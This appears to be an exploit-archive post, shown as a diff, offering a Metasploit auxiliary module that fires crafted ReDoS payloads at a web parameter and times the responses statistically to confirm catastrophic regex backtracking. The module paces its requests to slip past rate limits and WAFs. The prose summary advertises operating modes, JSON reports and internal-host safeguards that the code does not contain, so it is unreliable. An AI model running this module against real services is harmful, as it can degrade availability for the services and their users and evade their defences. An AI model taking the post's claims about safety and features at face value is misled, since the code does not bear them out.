@@ -1,0 +1,177 @@
+=============================================================================================================================================
+| # Title     : Regular Expression Denial of Service (ReDoS) Vulnerabilities                                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.pcre.org                                                                                                        |
+=============================================================================================================================================
+
+[+] Summary    : This Metasploit auxiliary module implements a scientific approach to detecting and validating ReDoS vulnerabilities in HTTP-based applications. 
+                 It leverages context-aware payload generation, length progression testing, and statistical analysis to identify inefficient 
+				 regular expressions that may cause exponential backtracking and Denial of Service.
+
+[+] The module provides multiple operation modes:
+
+DETECT: Performs context-specific ReDoS detection.
+
+VALIDATE: Statistically validates potential vulnerabilities using hypothesis testing.
+
+BENCHMARK: Conducts comprehensive performance benchmarking for various regex patterns.
+
+REPORT: Generates structured academic research reports with findings, methodology, and recommendations.
+
+It is designed to safely evaluate targets without causing actual denial of service, offering a research-grade tool for vulnerability assessment and academic publication. 
+The module supports output in JSON for reporting, and incorporates measures to prevent testing against restricted or internal hosts.
+
+[+] POC :
+
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current Source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Context-Aware ReDoS Statistical Exploiter',
+      'Description'    => %q{
+        This module is an advanced tool designed to detect Regular Expression Denial of Service (ReDoS) 
+        vulnerabilities. It utilizes a robust statistical engine (P95/MAD) to analyze the server's 
+        response curve, effectively distinguishing between network jitter/GC pauses and genuine 
+        algorithmic catastrophic backtracking.
+      },
+      'Author'         => [ 'indoushka'],
+      'License'        => MSF_LICENSE,
+      'References'     => [ [ 'CWE', '1333' ] ],
+      'Notes'          => {
+        'Stability'    => [ CRASH_SAFE ],
+        'SideEffects'  => [ IOC_IN_LOGS ]
+      }
+    ))
+
+    register_options([
+      OptString.new('TARGET_PARAM', [ true, "The vulnerable parameter name", "search"]),
+      OptString.new('TARGETURI', [ true, 'Target path', '/' ]),
+      OptEnum.new('CONTEXT', [ true, 'Target regex context', 'GENERIC', ['EMAIL', 'SEARCH', 'GENERIC']]),
+      OptEnum.new('METHOD', [ true, 'HTTP method to use', 'POST', ['GET', 'POST']]),
+      OptInt.new('PAYLOAD_LENGTH', [ true, 'Length of the explosive string', 40]),
+      OptInt.new('SAMPLES', [ true, 'Number of samples for large payload', 15]),
+      OptInt.new('TIMEOUT_VAL', [ true, 'Read timeout in seconds', 20])
+    ])
+  end
+
+  def calculate_p95(samples)
+    return 0 if samples.empty?
+    sorted = samples.sort
+    index = (sorted.length * 0.95).ceil - 1
+    sorted[index]
+  end
+
+  def calculate_median(samples)
+    return 0 if samples.empty?
+    sorted = samples.sort
+    len = sorted.length
+    (sorted[(len - 1) / 2] + sorted[len / 2]) / 2.0
+  end
+
+  def calculate_mad(samples, median)
+    return 0 if samples.empty?
+
+    deviations = samples.map { |s| (s - median).abs }.sort
+    calculate_median(deviations)
+  end
+
+  def get_payload(length)
+    case datastore['CONTEXT']
+    when 'EMAIL'
+
+      return ("a" * length) + "!" + "@example.com"
+    when 'SEARCH'
+      return "a" * length + "!"
+    else
+      return "a" * length + "X"
+    end
+  end
+
+  def measure_time(payload)
+
+    uri = normalize_uri(datastore['TARGETURI'].split('?').first)
+    start_time = Time.now
+    begin
+      send_request_cgi({
+        'method'    => datastore['METHOD'],
+        'uri'       => uri,
+        'vars_get'  => datastore['METHOD'] == 'GET' ? { datastore['TARGET_PARAM'] => payload } : {},
+        'vars_post' => datastore['METHOD'] == 'POST' ? { datastore['TARGET_PARAM'] => payload } : {}
+      }, datastore['TIMEOUT_VAL'])
+    rescue Rex::TimeoutError, Net::ReadTimeout
+      return datastore['TIMEOUT_VAL'] * 1000 
+    rescue => e
+      vprint_error("Connection error: #{e.message}")
+      return nil
+    end
+    ((Time.now - start_time) * 1000).to_i
+  end
+
+  def run_host(ip)
+
+    vprint_status("Phase 1: Warm-up iterations for #{ip}...")
+    5.times { measure_time("warmup") }
+
+    baseline = []
+    10.times { res = measure_time("safe"); baseline << res if res }
+    return if baseline.empty?
+    p95_baseline = calculate_p95(baseline)
+
+    small_samples = []
+    small_p = get_payload(datastore['PAYLOAD_LENGTH'] / 2)
+    10.times { res = measure_time(small_p); small_samples << res if res }
+    return if small_samples.empty?
+    p95_small = calculate_p95(small_samples)
+
+    large_samples = []
+    large_p = get_payload(datastore['PAYLOAD_LENGTH'])
+    datastore['SAMPLES'].times { 
+      res = measure_time(large_p)
+      large_samples << res if res
+      sleep(0.1) # Pacing to avoid Rate-limiting/WAF triggers
+    }
+    return if large_samples.empty?
+
+    p95_large = calculate_p95(large_samples)
+    median_large = calculate_median(large_samples)
+    mad_large = calculate_mad(large_samples, median_large)
+
+    growth_rate = p95_large / [p95_small, 1.0].max
+    mad_ratio = mad_large / [median_large, 1.0].max
+
+    vprint_line("--- Statistical Report for #{ip} ---")
+    vprint_line("P95 Baseline: #{p95_baseline.round(2)}ms")
+    vprint_line("P95 Large:    #{p95_large.round(2)}ms")
+    vprint_line("Growth Rate:  #{growth_rate.round(2)}x")
+    vprint_line("MAD Ratio:    #{mad_ratio.round(2)}")
+
+    is_exponential = p95_large > (p95_baseline * 10) && growth_rate > 2.2
+    is_stable = mad_ratio < 0.6 
+
+    if (is_exponential && is_stable) || p95_large >= (datastore['TIMEOUT_VAL'] * 1000)
+      print_good("#{ip} - VULNERABLE: ReDoS confirmed (Growth: #{growth_rate.round(2)}x)")
+      
+      report_vuln(
+        host: ip,
+        name: self.name,
+        refs: self.references,
+        info: "ReDoS confirmed on '#{datastore['TARGET_PARAM']}' | Growth: #{growth_rate.round(2)}x | P95: #{p95_large}ms"
+      )
+    else
+      print_status("#{ip} - Result negative: Response time is linear or environment too noisy.")
+    end
+  end
+end
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
